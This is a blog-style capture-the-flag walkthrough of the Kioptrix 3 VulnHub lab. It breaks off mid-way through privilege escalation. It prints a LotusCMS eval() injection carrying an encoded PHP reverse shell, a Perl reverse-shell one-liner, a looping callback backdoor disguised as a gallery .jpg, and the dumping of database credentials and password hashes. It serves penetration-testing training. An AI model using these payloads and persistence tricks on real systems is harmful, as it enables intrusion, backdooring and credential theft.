---
layout: post
title:  "Kioptrix: Level 1.2 (#3)"
date:   2019-05-13 14:29:33 +0000
author: Larry Brown
category: Walkthroughs
tags: [kioptrix, lotuscms, ht editor, perl, sudo]
---
    <div>VulnHub URL: <a target="_blank" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></div>
    <div>Hostname: Kioptrix3</div>
    <div>IP Address: 10.183.0.240</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Information Gathering/Recon</h2></div>
    <div><br /></div>
    <div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.240. The extracted VM also contained a TXT file stating that we should set the IP and hostname in our hosts file (to be able to access the web app). The hostname is <a target="_blank" href="http://kioptrix3.com/">kioptrix3.com</a>.</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Service Enumeration/Scanning</h2></div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix3# nmap -Pn -sT -sV -A --script=default,banner -oA kioptrix3 -p- kioptrix3.com</div>
        <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-12 19:07 CDT</div>
        <div>Nmap scan report for kioptrix3.com (10.183.0.240)</div>
        <div>Host is up (0.0027s latency).</div>
        <div>Not shown: 65533 closed ports</div>
        <div>PORT   STATE SERVICE VERSION</div>
        <div>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</font>
        </div>
        <div>|_banner: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">SSH-2.0-OpenSSH_4.7p1</font> Debian-8ubuntu1.2</div>
        <div>| ssh-hostkey: </div>
        <div>|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</div>
        <div>|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</div>
        <div>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</font>
        </div>
        <div>| http-cookie-flags: </div>
        <div>|   /: </div>
        <div>|     PHPSESSID: </div>
        <div>|_      httponly flag not set</div>
        <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.8</font> (Ubuntu) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.2.4-2ubuntu5.6</font> with Suhosin-Patch</div>
        <div>|_http-title: Ligoat Security - Got Goat? Security ...</div>
        <div>MAC Address: 00:0C:29:87:34:25 (VMware)</div>
        <div>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</div>
        <div>TCP/IP fingerprint:</div>
        <div>OS:SCAN(V=7.70%E=4%D=5/12%OT=22%CT=1%CU=36071%PV=Y%DS=1%DC=D%G=Y%M=000C29%T</div>
        <div>OS:M=5CD8B556%P=x86_64-pc-linux-gnu)SEQ(SP=C1%GCD=1%ISR=CD%TI=Z%CI=Z%II=I%T</div>
        <div>OS:S=7)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=</div>
        <div>OS:M5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1</div>
        <div>OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW5%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A</div>
        <div>OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%</div>
        <div>OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=</div>
        <div>OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</div>
        <div>OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</div>
        <div>OS:T=40%CD=S)</div>
        <div>
            <div><br /></div>
        </div>
        <div>Network Distance: 1 hop</div>
        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
        <div>
            <div><br /></div>
        </div>
        <div>TRACEROUTE</div>
        <div>HOP RTT     ADDRESS</div>
        <div>1   2.73 ms kioptrix3.com (10.183.0.240)</div>
        <div>
            <div><br /></div>
        </div>
        <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
        <div>Nmap done: 1 IP address (1 host up) scanned in 41.03 seconds</div>
    </div>
    <div><br /></div>
    <!--more-->
    <div><br /></div>
    <div><h2>Gaining Access</h2></div>
    <div><br /></div>
    <div>Looking at the software version numbers returned from nmap.</div>
    <ul>
        <li>
            <div>OpenSSH_4.7p1 - nothing of note</div>
        </li>
        <li>
            <div>Apache/2.2.8 - nothing of note</div>
        </li>
        <li>
            <div>PHP/5.2.4-2ubuntu5.6 - nothing of note</div>
        </li>
    </ul>
    <div><br /></div>
    <div>Time to start targeting the web app. Digging through the site, the login page indicates it is running Lotus CMS.</div>
    <div><br /></div>
    <div><img src="/assets/images/2019-05-13-kioptrix-level-1.2/5CE66A3E-F3DA-4494-A5B3-5D040AB50886.png" height="321" width="306" /><br /></div>
    <div><br /></div>
    <div>Checking the exploit database, we found some potential remote code vulnerabilities.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>LotusCMS 3.0.3 - Multiple Vulnerabilities                                                                    | exploits/php/webapps/16982.txt</div>
        <div>LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                                                | exploits/php/remote/18565.rb</div>
        <div>Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution                                          | exploits/php/webapps/15964.py</div>
        <div>Lotus Core CMS 1.0.1 - Remote File Inclusion                                                                 | exploits/php/webapps/5866.txt</div>
    </div>
    <div><br /></div>
    <div>Looking through each, the Metasploit one seems to be the most straight forward. It basically just involves posting exploit code to index.php. First, I’ll create my PHP reverse shell code using msfvenom. I’ll base64 encode it to make it simpler to post.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix3# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -e php/base64 -f raw &gt; rev.php</div>
        <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
        <div>[-] No arch selected, selecting arch: php from the payload</div>
        <div>Found 1 compatible encoders</div>
        <div>Attempting to encode payload with 1 iterations of php/base64</div>
        <div>php/base64 succeeded with size 4078 (iteration=0)</div>
        <div>php/base64 chosen with final size 4078</div>
        <div>Payload size: 4078 bytes</div>
    </div>
    <div><br /></div>
    <div>I’ll also start my PHP reverse shell listener (along with a second reverse shell listener). I like to create two listeners because reverse shells created through web requests often timeout pretty quickly.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>msf5 &gt; use exploit/multi/handler</div>
        <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
        <div>payload =&gt; php/reverse_php</div>
        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
        <div>LHOST =&gt; 10.183.0.222</div>
        <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
        <div>LPORT =&gt; 5432</div>
        <div>msf5 exploit(multi/handler) &gt; run -j</div>
        <div>[*] Exploit running as background job 0.</div>
        <div>[*] Exploit completed, but no session was created.</div>
        <div>
            <div><br /></div>
        </div>
        <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
        <div>msf5 exploit(multi/handler) &gt; </div>
        <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
        <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
        <div>payload =&gt; generic/shell_reverse_tcp</div>
        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
        <div>LHOST =&gt; 10.183.0.222</div>
        <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
        <div>LPORT =&gt; 5433</div>
        <div>msf5 exploit(multi/handler) &gt; run -j</div>
        <div>[*] Exploit running as background job 1.</div>
        <div>[*] Exploit completed, but no session was created.</div>
        <div>
            <div><br /></div>
        </div>
        <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
    </div>
    <div><br /></div>
    <div>Now, we just need to send our payload using curl.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>curl -d "page=index%27%29%3Beval%28base64_decode%28ICAgIC8qPD9waHAgLyoqLwogICAgICBAZXJyb3JfcmVwb3J0aW5nKDApOwogICAgICBAc2V0X3RpbWVfbGltaXQoMCk7IEBpZ25vcmVfdXNlcl9hYm9ydCgxKTsgQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CiAgICAgICRkaXM9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAgIGlmKCFlbXB0eSgkZGlzKSl7CiAgICAgICAgJGRpcz1wcmVnX3JlcGxhY2UoJy9bLCBdKy8nLCAnLCcsICRkaXMpOwogICAgICAgICRkaXM9ZXhwbG9kZSgnLCcsICRkaXMpOwogICAgICAgICRkaXM9YXJyYXlfbWFwKCd0cmltJywgJGRpcyk7CiAgICAgIH1lbHNlewogICAgICAgICRkaXM9YXJyYXkoKTsKICAgICAgfQogICAgICAKICAgICRpcGFkZHI9JzEwLjE4My4wLjIyMic7CiAgICAkcG9ydD01NDMyOwoKICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ0RzU3d2RnNRQycpKXsKICAgICAgZnVuY3Rpb24gRHNTd3ZGc1FDKCRjKXsKICAgICAgICBnbG9iYWwgJGRpczsKICAgICAgICAKICAgICAgaWYgKEZBTFNFICE9PSBzdHJwb3Moc3RydG9sb3dlcihQSFBfT1MpLCAnd2luJyApKSB7CiAgICAgICAgJGM9JGMuIiAyPiYxXG4iOwogICAgICB9CiAgICAgICR0akFvdEdkPSdpc19jYWxsYWJsZSc7CiAgICAgICRFc1pZa1Q9J2luX2FycmF5JzsKICAgICAgCiAgICAgIGlmKCR0akFv.dEdkKCdwYXNzdGhydScpYW5kISRFc1pZa1QoJ3Bhc3N0aHJ1JywkZGlzKSl7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBwYXNzdGhydSgkYyk7CiAgICAgICAgJG89b2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgb2JfZW5kX2NsZWFuKCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCR0akFvdEdkKCdwb3BlbicpYW5kISRFc1pZa1QoJ3BvcGVuJywkZGlzKSl7CiAgICAgICAgJGZwPXBvcGVuKCRjLCdyJyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICBpZihpc19yZXNvdXJjZSgkZnApKXsKICAgICAgICAgIHdoaWxlKCFmZW9mKCRmcCkpewogICAgICAgICAgICAkby49ZnJlYWQoJGZwLDEwMjQpOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBAcGNsb3NlKCRmcCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCR0akFvdEdkKCdzeXN0ZW0nKWFuZCEkRXNaWWtUKCdzeXN0ZW0nLCRkaXMpKXsKICAgICAgICBvYl9zdGFydCgpOwogICAgICAgIHN5c3RlbSgkYyk7CiAgICAgICAgJG89b2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgb2JfZW5kX2NsZWFuKCk7CiAgICAgIH1lbHNlCiAgICAgIGlmKCR0akFvdEdkKCdzaGVsbF9leGVjJylhbmQhJEVzWllrVCgnc2hlbGxfZXhlYycsJGRpcykpewogICAgICAgICRvPXNoZWxsX2V4ZWMoJGMpOwogICAgICB9ZWxzZQogICAgICBpZig.kdGpBb3RHZCgncHJvY19vcGVuJylhbmQhJEVzWllrVCgncHJvY19vcGVuJywkZGlzKSl7CiAgICAgICAgJGhhbmRsZT1wcm9jX29wZW4oJGMsYXJyYXkoYXJyYXkoJ3BpcGUnLCdyJyksYXJyYXkoJ3BpcGUnLCd3JyksYXJyYXkoJ3BpcGUnLCd3JykpLCRwaXBlcyk7CiAgICAgICAgJG89TlVMTDsKICAgICAgICB3aGlsZSghZmVvZigkcGlwZXNbMV0pKXsKICAgICAgICAgICRvLj1mcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAgICAgfQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOwogICAgICB9ZWxzZQogICAgICBpZigkdGpBb3RHZCgnZXhlYycpYW5kISRFc1pZa1QoJ2V4ZWMnLCRkaXMpKXsKICAgICAgICAkbz1hcnJheSgpOwogICAgICAgIGV4ZWMoJGMsJG8pOwogICAgICAgICRvPWpvaW4oY2hyKDEwKSwkbykuY2hyKDEwKTsKICAgICAgfWVsc2UKICAgICAgewogICAgICAgICRvPTA7CiAgICAgIH0KICAgIAogICAgICAgIHJldHVybiAkbzsKICAgICAgfQogICAgfQogICAgJG5vZnVuY3M9J25vIGV4ZWMgZnVuY3Rpb25zJzsKICAgIGlmKGlzX2NhbGxhYmxlKCdmc29ja29wZW4nKWFuZCFpbl9hcnJheSgnZnNvY2tvcGVuJywkZGlzKSl7CiAgICAgICRzPUBmc29ja29wZW4oInRjcDovLzEwLjE4My4wLjIyMiIsJHBvcnQpOwogICAgICB3aGlsZSgkYz1mcmVhZCgkcywyMD.Q4KSl7CiAgICAgICAgJG91dCA9ICcnOwogICAgICAgIGlmKHN1YnN0cigkYywwLDMpID09ICdjZCAnKXsKICAgICAgICAgIGNoZGlyKHN1YnN0cigkYywzLC0xKSk7CiAgICAgICAgfSBlbHNlIGlmIChzdWJzdHIoJGMsMCw0KSA9PSAncXVpdCcgfHwgc3Vic3RyKCRjLDAsNCkgPT0gJ2V4aXQnKSB7CiAgICAgICAgICBicmVhazsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICRvdXQ9RHNTd3ZGc1FDKHN1YnN0cigkYywwLC0xKSk7CiAgICAgICAgICBpZigkb3V0PT09ZmFsc2UpewogICAgICAgICAgICBmd3JpdGUoJHMsJG5vZnVuY3MpOwogICAgICAgICAgICBicmVhazsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZndyaXRlKCRzLCRvdXQpOwogICAgICB9CiAgICAgIGZjbG9zZSgkcyk7CiAgICB9ZWxzZXsKICAgICAgJHM9QHNvY2tldF9jcmVhdGUoQUZfSU5FVCxTT0NLX1NUUkVBTSxTT0xfVENQKTsKICAgICAgQHNvY2tldF9jb25uZWN0KCRzLCRpcGFkZHIsJHBvcnQpOwogICAgICBAc29ja2V0X3dyaXRlKCRzLCJzb2NrZXRfY3JlYXRlIik7CiAgICAgIHdoaWxlKCRjPUBzb2NrZXRfcmVhZCgkcywyMDQ4KSl7CiAgICAgICAgJG91dCA9ICcnOwogICAgICAgIGlmKHN1YnN0cigkYywwLDMpID09ICdjZCAnKXsKICAgICAgICAgIGNoZGlyKHN1YnN0cigkYywzLC0xKSk7C.iAgICAgICAgfSBlbHNlIGlmIChzdWJzdHIoJGMsMCw0KSA9PSAncXVpdCcgfHwgc3Vic3RyKCRjLDAsNCkgPT0gJ2V4aXQnKSB7CiAgICAgICAgICBicmVhazsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICRvdXQ9RHNTd3ZGc1FDKHN1YnN0cigkYywwLC0xKSk7CiAgICAgICAgICBpZigkb3V0PT09ZmFsc2UpewogICAgICAgICAgICBAc29ja2V0X3dyaXRlKCRzLCRub2Z1bmNzKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIEBzb2NrZXRfd3JpdGUoJHMsJG91dCxzdHJsZW4oJG91dCkpOwogICAgICB9CiAgICAgIEBzb2NrZXRfY2xvc2UoJHMpOwogICAgfQo%29%29%3B%23" http://kioptrix3.com/index.php</div>
    </div>
    <div><br /></div>
    <div>After sending our payload, we got a session in Metasploit, then started our second session.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.240:56052) at 2019-05-12 22:02:22 -0500</div>
        <div>
            <div><br /></div>
        </div>
        <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
        <div>[*] Starting interaction with 1...</div>
        <div>
            <div><br /></div>
        </div>
        <div>pwd</div>
        <div>/home/www/kioptrix3.com</div>
        <div>id</div>
        <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
        <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
        <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.240:52844) at 2019-05-12 22:02:35 -0500</div>
    </div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Maintaining Access</h2></div>
    <div><br /></div>
    <div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix3:/home/www/kioptrix3.com/gallery$ grep `whoami` /etc/passwd</div>
        <div>www-data:x:33:33:www-data:/var/www:/bin/sh</div>
    </div>
    <div><br /></div>
    <div>The home directory exists, but only allows writes by root.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>drwxr-xr-x  2 root root  4096 Apr 12  2011 www</div>
    </div>
    <div><br /></div>
    <div>I won’t be able to set up SSH keys, so I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes and use python’s SimpleHTTPServer to serve it up to the victim.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix3# cat thumbs</div>
        <div>#!/bin/sh</div>
        <div>while true; do</div>
        <div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
        <div>    # sleep for 300 seconds (5 mins)</div>
        <div>    sleep 300</div>
        <div>done</div>
        <div>root@kali:~/Walkthroughs/kioptrix3# python -m SimpleHTTPServer 4321                                                                                   Serving HTTP on 0.0.0.0 port 4321 ...                                                                                                                 10.183.0.240 - - [12/May/2019 22:26:23] "GET /thumbs HTTP/1.0" 200 -</div>
    </div>
    <div><br /></div>
    <div>I uploaded the script to the victim's /home/www/<a target="_blank" href="http://kioptrix3.com/gallery/photos">kioptrix3.com/gallery/photos</a> directory (with a file name similar to existing photos) and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix3:/home/www/kioptrix3.com/gallery/photos$ wget -O thumb_daqpu89u9h.jpg 10.183.0.222:4321/thumbs</div>
        <div>&lt;otos$ wget -O thumb_daqpu89u9h.jpg 10.183.0.222:4321/thumbs                 </div>
        <div>--18:26:24--  http://10.183.0.222:4321/thumbs</div>
        <div>           =&gt; `thumb_daqpu89u9h.jpg'</div>
        <div>Connecting to 10.183.0.222:4321... connected.</div>
        <div>HTTP request sent, awaiting response... 200 OK</div>
        <div>Length: 309 [application/octet-stream]</div>
        <div>
            <div><br /></div>
        </div>
        <div>100%[====================================&gt;] 309           --.--K/s             </div>
        <div>
            <div><br /></div>
        </div>
        <div>18:26:24 (59.20 MB/s) - `thumb_daqpu89u9h.jpg' saved [309/309]</div>
        <div>
            <div><br /></div>
        </div>
        <div>www-data@Kioptrix3:/home/www/kioptrix3.com/gallery/photos$ chmod +x thumb_daqpu89u9h.jpg</div>
        <div>&lt;w/kioptrix3.com/gallery/photos$ chmod +x thumb_daqpu89u9h.jpg               </div>
        <div>www-data@Kioptrix3:/home/www/kioptrix3.com/gallery/photos$ ./thumb_daqpu89u9h.jpg &amp;</div>
        <div>&lt;w/kioptrix3.com/gallery/photos$ ./thumb_daqpu89u9h.jpg &amp;                    </div>
        <div>[1] 4333</div>
    </div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Privilege Escalation</h2></div>
    <div><br /></div>
    <div>Checking the gconfig.php file in /home/www/<a target="_blank" href="http://kioptrix3.com/gallery">kioptrix3.com/gallery</a>, we found credentials for the MySQL server.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix3:/home/www/<a target="_blank" href="http://kioptrix3.com/gallery">kioptrix3.com/gallery</a>$ cat gconfig.php</div>
        <div>&lt;?php</div>
        <div>        error_reporting(0);</div>
        <div>        /*</div>
        <div>                A sample Gallarific configuration file. You should edit</div>
        <div>                the installer details below and save this file as gconfig.php</div>
        <div>                Do not modify anything else if you don't know what it is.</div>
        <div>        */</div>
        <div><br /></div>
        <div>        // Installer Details -----------------------------------------------</div>
        <div><br /></div>
        <div>        // Enter the full HTTP path to your Gallarific folder below,</div>
        <div>        // such as <a target="_blank" href="http://www.yoursite.com/gallery">http://www.yoursite.com/gallery</a></div>
        <div>        // Do NOT include a trailing forward slash</div>
        <div><br /></div>
        <div>        $GLOBALS["gallarific_path"] = "<a target="_blank" href="http://kioptrix3.com/gallery">http://kioptrix3.com/gallery";</a></div>
        <div><br /></div>
        <div>        <span style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">$GLOBALS["gallarific_mysql_server"] = "localhost";</span></div>
        <div><span style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">        $GLOBALS["gallarific_mysql_database"] = "gallery";</span></div>
        <div><span style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">        $GLOBALS["gallarific_mysql_username"] = "root";</span></div>
        <div><span style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";</span></div>
        <div><br /></div>
        <div>        // Setting Details -------------------------------------------------</div>
        <div><br /></div>
        <div>if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {</div>
        <div>                echo("A connection to the database couldn't be established: " . mysql_error());</div>
        <div>                die();</div>
        <div>}else {</div>
        <div>        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {</div>
        <div>                echo("The Gallarific database couldn't be opened: " . mysql_error());</div>
        <div>                die();</div>
        <div>        }else {</div>
        <div>                $settings=mysql_query("select * from gallarific_settings");</div>
        <div>                if(mysql_num_rows($settings)!=0){   </div>
        <div>                        while($data=mysql_fetch_array($settings)){</div>
        <div>                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];</div>
        <div>                        }</div>
        <div>                }</div>
        <div><br /></div>
        <div>        }</div>
        <div>}</div>
        <div><br /></div>
        <div>?&gt;</div>
    </div>
    <div><br /></div>
    <div>I logged into the MySQL server with the database credentials found in the config page to pull user accounts and passwords from the gallery database.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix3:/home/www/<a target="_blank" href="http://kioptrix3.com/gallery">kioptrix3.com/gallery</a>$ mysql -u root -p</div>
        <div>Enter password: fuckeyou</div>
        <div><br /></div>
        <div>Welcome to the MySQL monitor.  Commands end with ; or \g.</div>
        <div>Your MySQL connection id is 47</div>
        <div>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</div>
        <div><br /></div>
        <div>Type 'help;' or '\h' for help. Type '\c' to clear the buffer.</div>
        <div><br /></div>
        <div>mysql&gt; show databases;</div>
        <div>show databases;</div>
        <div>+--------------------+</div>
        <div>| Database           |</div>
        <div>+--------------------+</div>
        <div>| information_schema |</div>
        <div>| gallery            |</div>
        <div>| mysql              |</div>
        <div>+--------------------+</div>
        <div>3 rows in set (0.00 sec)</div>
        <div><br /></div>
        <div>mysql&gt; use gallery;</div>
        <div>use gallery;</div>
        <div>Reading table information for completion of table and column names</div>
        <div>You can turn off this feature to get a quicker startup with -A</div>
        <div><br /></div>
        <div>Database changed</div>
        <div>mysql&gt; show tables;</div>
        <div>+----------------------+</div>
        <div>| Tables_in_gallery    |</div>
        <div>+----------------------+</div>
        <div>| dev_accounts         |</div>
        <div>| gallarific_comments  |</div>
        <div>| gallarific_galleries |</div>
        <div>| gallarific_photos    |</div>
        <div>| gallarific_settings  |</div>
        <div>| gallarific_stats     |</div>
        <div>| gallarific_users     |</div>
        <div>+----------------------+</div>
        <div>7 rows in set (0.00 sec)</div>
        <div><br /></div>
        <div>mysql&gt; select * from dev_accounts;</div>
        <div>+----+------------+----------------------------------+</div>
        <div>| id | username   | password                         |</div>
        <div>+----+------------+----------------------------------+</div>
        <div>|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |</div>
        <div>|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |</div>
        <div>+----+------------+----------------------------------+</div>
        <div>2 rows in set (0.00 sec)</div>
        <div><br /></div>
        <div>mysql&gt; select * from gallarific_users;</div>
        <div>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+</div>
